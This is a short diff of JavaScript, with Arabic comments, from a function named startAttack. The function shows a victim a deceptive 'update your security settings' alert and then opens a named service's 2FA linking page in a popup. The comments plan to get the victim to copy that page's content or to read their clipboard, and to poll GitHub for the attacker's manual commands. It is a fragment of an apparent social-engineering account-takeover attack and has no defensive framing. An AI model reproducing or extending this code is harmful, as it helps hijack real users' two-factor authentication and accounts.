@@ -21,15 +21,16 @@
         async function startAttack() {
     // المرحلة 1: فتح صفحة الكود للضحية في نافذة جديدة (Popup)
     // المتصفح سيطلب من الضحية السماح بالـ Popup، لذا اجعلها نتيجة "ضغطة زر"
-                alert("اضغط موافق لتحديث إعدادات الأمان الخاصة بك");
-                let victimWin = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "_blank", "width=500,height=500");
+            alert("اضغط موافق لتحديث إعدادات الأمان الخاصة بك");
+            let victimWin = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "_blank", "width=500,height=500");
 
     // المرحلة 2: بما أننا لا نستطيع قراءة محتوى victimWin، سنطلب من الضحية "نسخه"
     // أو سنقوم بمراقبة الـ Clipboard إذا كان المتصفح قديماً، 
     // لكن الأفضل هو الانتظار حتى تضع أنت الرابط في جيت هب يدوياً بعد رؤيته
     
-                console.log("Waiting for manual command from GitHub...");
-                monitorGitHub(); 
+            console.log("Waiting for manual command from GitHub...");
+            monitorGitHub();
+            
             }, 3000);
         }
 
